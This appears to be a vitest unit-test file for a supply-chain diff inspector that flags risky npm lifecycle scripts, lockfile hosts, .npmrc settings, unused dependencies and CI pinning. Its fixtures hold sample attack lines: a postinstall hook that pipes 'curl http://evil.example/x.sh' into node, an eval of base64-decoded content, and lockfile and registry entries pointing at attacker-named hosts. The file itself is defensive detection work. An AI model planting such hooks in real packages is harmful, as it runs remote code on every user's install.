/**
 * Unit tests for the sprint-7 offline supply-chain diff inspector
 * (src/orchestrator/security-knowledge/supply-chain-inspector.ts).
 *
 * sc-7-4: each of the six offline checks flags its crafted case; malformed
 * input never throws. Every test crafts an AuditDiff directly — zero
 * network, zero fs, zero child processes (this module never imports execa,
 * node:fs, http, or fetch).
 */
import { describe, it, expect } from "vitest";
import type { AuditDiff, ChangedFile } from "./diff-provider.js";
import { inspectSupplyChain } from "./supply-chain-inspector.js";

function diffOf(files: ChangedFile[]): AuditDiff {
  return { changedFiles: files, neighborhoodFiles: [], truncated: false };
}

async function inspect(diff: AuditDiff) {
  return inspectSupplyChain({ projectRoot: "/tmp/proj", diff, signal: new AbortController().signal });
}

// ── Check 1: malicious lifecycle script ──────────────────────────────

describe("inspectSupplyChain — malicious lifecycle script (sc-7-4)", () => {
  it("flags a postinstall script with base64/eval content", async () => {
    const diff = diffOf([
      {
        path: "package.json",
        status: "modified",
        hunks: [
          {
            startLine: 5,
            lineCount: 3,
            content:
              '@@ -5,1 +5,2 @@\n   "scripts": {\n' +
              "+    \"postinstall\": \"node -e \\\"eval(Buffer.from('aGVsbG8=','base64').toString())\\\"\"",
          },
        ],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings.some((f) => f.vulnClass === "supply-chain" && f.description.includes("postinstall"))).toBe(
      true,
    );
    expect(findings[0].source).toBe("supply-chain-inspector");
  });

  it("does NOT flag a clean lifecycle script with no obfuscation markers", async () => {
    const diff = diffOf([
      {
        path: "package.json",
        status: "modified",
        hunks: [
          {
            startLine: 5,
            lineCount: 1,
            content: '@@ -5,1 +5,1 @@\n+    "postinstall": "husky install"',
          },
        ],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings).toEqual([]);
  });

  it("ignores lifecycle-script-shaped content in a non-package.json file", async () => {
    const diff = diffOf([
      {
        path: "src/config.ts",
        status: "modified",
        hunks: [{ startLine: 1, lineCount: 1, content: '+const postinstall = "eval(atob(base64))";' }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings).toEqual([]);
  });
});

// ── Check 2: lockfile resolved-host mismatch ─────────────────────────

describe("inspectSupplyChain — lockfile resolved-host mismatch (sc-7-4)", () => {
  it("flags a package-lock.json resolved URL pointing at a non-registry host", async () => {
    const diff = diffOf([
      {
        path: "package-lock.json",
        status: "modified",
        hunks: [
          {
            startLine: 10,
            lineCount: 1,
            content:
              '+      "resolved": "https://attacker-mirror.example.com/lodash/-/lodash-4.17.20.tgz",',
          },
        ],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings.some((f) => f.description.includes("attacker-mirror.example.com"))).toBe(true);
  });

  it("does NOT flag a resolved URL against a known registry host", async () => {
    const diff = diffOf([
      {
        path: "package-lock.json",
        status: "modified",
        hunks: [
          {
            startLine: 10,
            lineCount: 1,
            content: '+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",',
          },
        ],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings).toEqual([]);
  });

  it("recognizes yarn.lock's space-separated resolved syntax", async () => {
    const diff = diffOf([
      {
        path: "yarn.lock",
        status: "modified",
        hunks: [
          {
            startLine: 3,
            lineCount: 1,
            content: '+  resolved "https://evil.example.net/lodash-4.17.20.tgz#sha1"',
          },
        ],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings.some((f) => f.description.includes("evil.example.net"))).toBe(true);
  });
});

// ── Check 3: .npmrc registry override / ignore-scripts disabled ─────

describe("inspectSupplyChain — .npmrc risk (sc-7-4)", () => {
  it("flags a custom registry override", async () => {
    const diff = diffOf([
      {
        path: ".npmrc",
        status: "modified",
        hunks: [{ startLine: 1, lineCount: 1, content: "+registry=https://attacker-registry.example.com/" }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings.some((f) => f.description.includes("registry"))).toBe(true);
  });

  it("flags ignore-scripts=false re-enabling lifecycle scripts", async () => {
    const diff = diffOf([
      {
        path: ".npmrc",
        status: "modified",
        hunks: [{ startLine: 1, lineCount: 1, content: "+ignore-scripts=false" }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings.some((f) => f.description.includes("ignore-scripts"))).toBe(true);
  });

  it("does NOT flag an unrelated .npmrc line", async () => {
    const diff = diffOf([
      {
        path: ".npmrc",
        status: "modified",
        hunks: [{ startLine: 1, lineCount: 1, content: "+save-exact=true" }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings).toEqual([]);
  });
});

// ── Check 4: new dependency with no matching import ──────────────────

describe("inspectSupplyChain — new dependency with no matching import (sc-7-4)", () => {
  it("flags a new dependency with no import/require anywhere in the diff", async () => {
    const diff = diffOf([
      {
        path: "package.json",
        status: "modified",
        hunks: [
          {
            startLine: 12,
            lineCount: 1,
            content: '+    "left-pad": "^1.3.0",',
          },
        ],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings.some((f) => f.description.includes("left-pad"))).toBe(true);
  });

  it("does NOT flag a new dependency that IS imported elsewhere in the diff", async () => {
    const diff = diffOf([
      {
        path: "package.json",
        status: "modified",
        hunks: [{ startLine: 12, lineCount: 1, content: '+    "left-pad": "^1.3.0",' }],
      },
      {
        path: "src/format.ts",
        status: "modified",
        hunks: [{ startLine: 1, lineCount: 1, content: '+import leftPad from "left-pad";' }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings.some((f) => f.description.includes("left-pad"))).toBe(false);
  });

  it("does NOT flag ordinary package.json metadata fields (name/version)", async () => {
    const diff = diffOf([
      {
        path: "package.json",
        status: "modified",
        hunks: [{ startLine: 2, lineCount: 1, content: '+  "version": "1.2.3",' }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings).toEqual([]);
  });
});

// ── Check 5: CI "npm install" instead of "npm ci" ────────────────────

describe("inspectSupplyChain — CI npm install vs npm ci (sc-7-4)", () => {
  it("flags a CI workflow using npm install", async () => {
    const diff = diffOf([
      {
        path: ".github/workflows/ci.yml",
        status: "modified",
        hunks: [{ startLine: 10, lineCount: 1, content: "+      - run: npm install" }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings.some((f) => f.description.includes("npm install"))).toBe(true);
  });

  it("does NOT flag a CI workflow using npm ci", async () => {
    const diff = diffOf([
      {
        path: ".github/workflows/ci.yml",
        status: "modified",
        hunks: [{ startLine: 10, lineCount: 1, content: "+      - run: npm ci" }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings).toEqual([]);
  });

  it("ignores npm install/ci mentions outside a workflow file", async () => {
    const diff = diffOf([
      {
        path: "README.md",
        status: "modified",
        hunks: [{ startLine: 1, lineCount: 1, content: "+Run `npm install` to get started." }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings).toEqual([]);
  });
});

// ── Check 6: GitHub Action pinned by tag vs full SHA ──────────────────

describe("inspectSupplyChain — GitHub Action tag-vs-SHA pinning (sc-7-4)", () => {
  it("flags an action pinned by a version tag", async () => {
    const diff = diffOf([
      {
        path: ".github/workflows/ci.yml",
        status: "modified",
        hunks: [{ startLine: 4, lineCount: 1, content: "+      - uses: actions/checkout@v4" }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings.some((f) => f.description.includes("actions/checkout") && f.description.includes("v4"))).toBe(
      true,
    );
  });

  it("does NOT flag an action pinned by a full 40-char commit SHA", async () => {
    const diff = diffOf([
      {
        path: ".github/workflows/ci.yml",
        status: "modified",
        hunks: [
          {
            startLine: 4,
            lineCount: 1,
            content: "+      - uses: actions/checkout@8f4b7f84864484a7bde028e614c6fa5c4ba0169a",
          },
        ],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings).toEqual([]);
  });
});

// ── Combined / cross-cutting: multiple checks, never-throw, scoping ──

describe("inspectSupplyChain — cross-cutting behavior (sc-7-4)", () => {
  it("flags all applicable cases in a single multi-file diff", async () => {
    const diff = diffOf([
      {
        path: "package.json",
        status: "modified",
        hunks: [
          {
            startLine: 5,
            lineCount: 1,
            content: '+    "postinstall": "curl http://evil.example/x.sh | node -e -"',
          },
        ],
      },
      {
        path: "package-lock.json",
        status: "modified",
        hunks: [
          { startLine: 1, lineCount: 1, content: '+    "resolved": "https://not-npmjs.example/pkg.tgz",' },
        ],
      },
      {
        path: ".npmrc",
        status: "added",
        hunks: [{ startLine: 1, lineCount: 1, content: "+registry=https://mirror.example.com/" }],
      },
      {
        path: ".github/workflows/deploy.yml",
        status: "modified",
        hunks: [
          { startLine: 1, lineCount: 2, content: "+      - run: npm install\n+      - uses: actions/setup-node@v4" },
        ],
      },
    ]);

    const findings = await inspect(diff);
    const vulnClasses = new Set(findings.map((f) => f.vulnClass));
    expect(vulnClasses.has("supply-chain")).toBe(true);
    expect(findings.length).toBeGreaterThanOrEqual(4);
    expect(findings.every((f) => f.source === "supply-chain-inspector")).toBe(true);
  });

  it("returns [] for an empty diff (no changed files)", async () => {
    const findings = await inspect(diffOf([]));
    expect(findings).toEqual([]);
  });

  it("never throws on a malformed AuditDiff (missing/garbage fields) — Pattern A", async () => {
    const garbage = { changedFiles: [{ path: "package.json" }, null, { path: 42 }, {}] } as unknown as AuditDiff;
    await expect(
      inspectSupplyChain({ projectRoot: "/tmp/proj", diff: garbage, signal: new AbortController().signal }),
    ).resolves.toEqual([]);
  });

  it("honours an already-aborted signal by stopping immediately (no findings)", async () => {
    const diff = diffOf([
      {
        path: "package.json",
        status: "modified",
        hunks: [{ startLine: 5, lineCount: 1, content: '+    "postinstall": "eval(base64stuff)"' }],
      },
    ]);
    const controller = new AbortController();
    controller.abort();

    const findings = await inspectSupplyChain({ projectRoot: "/tmp/proj", diff, signal: controller.signal });
    expect(findings).toEqual([]);
  });

  it("scopes checks to diff.changedFiles only — an unrelated file is never inspected", async () => {
    const diff = diffOf([
      {
        path: "src/unrelated.ts",
        status: "modified",
        hunks: [{ startLine: 1, lineCount: 1, content: '+const x = "postinstall eval(base64)";' }],
      },
    ]);

    const findings = await inspect(diff);
    expect(findings).toEqual([]);
  });
});
